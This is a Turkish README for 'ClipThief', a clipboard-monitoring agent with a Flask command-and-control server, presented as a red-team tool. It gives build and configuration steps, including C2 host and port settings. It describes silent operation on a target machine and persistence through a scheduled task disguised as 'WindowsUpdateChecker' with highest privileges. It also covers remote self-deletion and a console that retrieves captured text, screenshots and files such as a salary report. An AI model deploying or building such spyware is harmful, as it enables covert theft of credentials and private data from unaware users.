```
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     Be careful what you copy. 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢙⣛⣛⣛⣛⣛⣛⣛⣉⣩⣭⣴⣾⣿⣿⢣⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣼⣿⣿⣿⣿

```

# ClipThief

Windows clipboard izleme aracı. Red team tatbikatları ve güvenlik araştırmaları için geliştirilmiştir.

**Yazar:** @erberkan / B3R-SEC

---

## Bileşenler

| Bileşen | Teknoloji | Açıklama |
|---------|-----------|----------|
| **Agent** | C++ / Win32 API | Hedef sistemde arka planda çalışır, clipboard'ı izler |
| **C2 Sunucusu** | Python 3 + Flask | Operatör terminal arayüzü, SQLite veritabanı |

---

## Gereksinimler

### C2 Sunucusu
- Python 3.8 veya üstü
- pip

### Agent (Derleme için)
- Windows 10/11
- Visual Studio 2022 (Community veya üstü)
- Windows 10 SDK

---

## Kurulum

### 1. C2 Sunucusu

```bash
cd C2
pip install -r requirements.txt
```

`requirements.txt` içeriği:
```
flask>=3.0.0
rich>=13.0.0
```

### 2. Agent — Derleme Öncesi Yapılandırma

`ClipboardDump/ClipboardDump/ClipboardDump.cpp` dosyasını açın ve C2 adresini güncelleyin:

```cpp
// Satır ~37
static const char* C2_HOST = "127.0.0.1";  // ← C2 sunucunuzun IP'si
static const int   C2_PORT = 5000;          // ← C2 portu
```

İsteğe bağlı ayarlar:

```cpp
static const int   POLL_MS   = 3000;                   // Komut polling aralığı (ms)
static const char* TASK_NAME = "WindowsUpdateChecker"; // Scheduled task adı
static const size_t MAX_FILE = 50 * 1024 * 1024;       // Max dosya boyutu (50MB)
```

### 3. Agent — Derleme

1. `ClipboardDump/ClipboardDump.sln` dosyasını Visual Studio 2022 ile açın
2. Konfigürasyon olarak **Release | x64** seçin
3. `Build → Build Solution` (veya `Ctrl+Shift+B`)
4. Derlenen EXE: `ClipboardDump/x64/Release/ClipboardDump.exe`

---

## Kullanım

### C2 Sunucusunu Başlatma

```bash
cd C2

# Varsayılan (0.0.0.0:5000)
python c2_server.py

# Özel adres ve port
python c2_server.py --host 192.168.1.100 --port 8080

# Windows'ta batch ile (bağımlılıkları otomatik yükler)
setup_and_run.bat
```

Başarılı başlatma çıktısı:
```
[*] Database: C:\...\C2\c2_data.db  (0 agents loaded)
[*] Listening on 0.0.0.0:5000
```

### Agent'ı Çalıştırma

Derlenmiş `ClipboardDump.exe` dosyasını hedef sistemde çalıştırın.

- Konsol penceresi açılmaz (Windows subsystem)
- Task Manager'da `ClipboardDump.exe` olarak görünür
- C2 erişilebilir değilse sessizce beklemeye devam eder

---

## C2 Arayüzü

### Ana Ekran

```
=======================================================
       ClipThief C2 Server  |  @erberkan / B3R-SEC
=======================================================

  #    ID (short)  USER             HOSTNAME             IP               LAST SEEN
  --------------------------------------------------------------------------------------------
  1    a1b2c3d4... erberkan         DESKTOP-ABC123       192.168.1.50     2026-04-21 14:35:00

  [N]  Select agent by number
  [D]  Database management
  [R]  Refresh
  [Q]  Quit
```

### Yeni Agent Bağlandığında

Agent ilk kez bağlandığında terminal'e otomatik bildirim gelir ve agent menüsü açılır:

```
  ╔════════════════════════════════════════════════════════╗
  ║              *** NEW AGENT CONNECTED ***               ║
  ╠════════════════════════════════════════════════════════╣
  ║  ID      : a1b2c3d4-e5f6-...                          ║
  ║  User    : erberkan                                    ║
  ║  Hostname: DESKTOP-ABC123                              ║
  ║  IP      : 192.168.1.50                                ║
  ║  OS      : Windows 10.0 Build 19045                    ║
  ║  Time    : 2026-04-21 14:32:11                         ║
  ╚════════════════════════════════════════════════════════╝
  Press Enter to open agent menu...
```

### Agent Menüsü

```
  [1] View clipboard history        → Clipboard geçmişini görüntüle
  [2] Send KILL command             → Agent'ı uzaktan yok et
  [3] Send PERSIST command          → Scheduled task ekle (kalıcılık)
  [4] Delete this agent from DB     → Sadece bu agent'ı DB'den sil
  [0] Back
```

### Clipboard Geçmişi

```
  #     TYPE   TIMESTAMP              PREVIEW / FILENAME
  -------------------------------------------------------
  1     text   2026-04-21 14:32:15    SELECT * FROM users...
  2     image  2026-04-21 14:35:01    clipboard.bmp
  3     file   2026-04-21 14:38:44    salary_report.xlsx
```

Komutlar:
- `1` — #1 kaydı görüntüle (metin inline, resim/dosya otomatik açılır)
- `D 2` — #2 kaydı `downloads/` klasörüne indir
- `0` — Geri

### Desteklenen Clipboard Tipleri

| Tip | Windows Formatı | C2'de Görünüm |
|-----|----------------|---------------|
| Metin | `CF_UNICODETEXT` | Terminal'de inline |
| Resim (screenshot vb.) | `CF_DIB` | BMP olarak kaydedilip açılır |
| Kopyalanan dosya | `CF_HDROP` | Orijinal uzantıyla indirilir |

---

## Komutlar

### KILL — Self-Destruct

Agent menüsünden `[2]` → `yes` ile onaylayın.

Agent bir sonraki polling'de (max 3 saniye) komutu alır ve:
1. Registry'deki AgentID değerini siler
2. Kendini silecek bir batch dosyası oluşturur
3. Process'i sonlandırır
4. EXE dosyasını diskten siler

### PERSIST — Scheduled Task

Agent menüsünden `[3]` ile gönderin.

Agent aşağıdaki göreve kendini ekler:
- **Task adı:** `WindowsUpdateChecker` (kaynak kodda değiştirilebilir)
- **Tetikleyici:** Her kullanıcı girişinde (`onlogon`)
- **Yetki:** En yüksek (`highest`)

Elle kaldırmak için:
```cmd
schtasks /delete /tn "WindowsUpdateChecker" /f
```

---

## Veritabanı Yönetimi

Ana menüden `[D]` ile veritabanı yönetim ekranına ulaşın:

```
  Database : C:\...\C2\c2_data.db
  Size     : 2,048,576 bytes
  Agents   : 3
  Clipboard: 892 entries

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

- **Tüm veriyi sil:** `[1]` → `YES` (büyük harf zorunlu)
- **Tek agent sil:** Agent menüsü → `[4]`

C2 yeniden başlatıldığında veritabanı otomatik yüklenir; tüm geçmiş korunur.

---

## Dosya Yapısı

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp       # Agent kaynak kodu
│       └── ClipboardDump.vcxproj
│
├── C2/
│   ├── c2_server.py                # C2 sunucusu
│   ├── requirements.txt
│   ├── setup_and_run.bat           # Windows başlatma scripti
│   ├── c2_data.db                  # Veritabanı (otomatik oluşur)
│   └── downloads/                  # İndirilen dosyalar
│
├── PROJECT.md                      # Teknik dokümantasyon
└── README.md                       # Bu dosya
```

---

## Sık Karşılaşılan Sorunlar

### Agent C2'ye bağlanamıyor
- `C2_HOST` ve `C2_PORT` doğru mu kontrol edin
- C2 sunucusu çalışıyor mu kontrol edin
- Windows Firewall hedef port için açık mı kontrol edin

### Derleme hatası: `identifier not found`
- Visual Studio'da **Release | x64** konfigürasyonu seçili mi kontrol edin
- Windows 10 SDK yüklü mu kontrol edin (`Tools → Get Tools and Features`)

### Clipboard değişimi C2'ye gelmiyor
- Agent'ın `ClipboardDump.exe` olarak Task Manager'da çalıştığını doğrulayın
- C2 loglarında `[~] AGENT RECONNECTED` mesajına bakın

### İndirilen resim açılmıyor
- `downloads/` klasöründeki `.bmp` dosyası Windows Resim Görüntüleyici ile açılabilir
- Büyük ekran görüntülerinde BMP boyutu yüksek olabilir (sıkıştırmasız format)

---

## Teknik Detaylar

Mimarinin tam açıklaması, tüm fonksiyonların belgelenmesi ve veri akışı diyagramları için `PROJECT.md` dosyasına bakın.
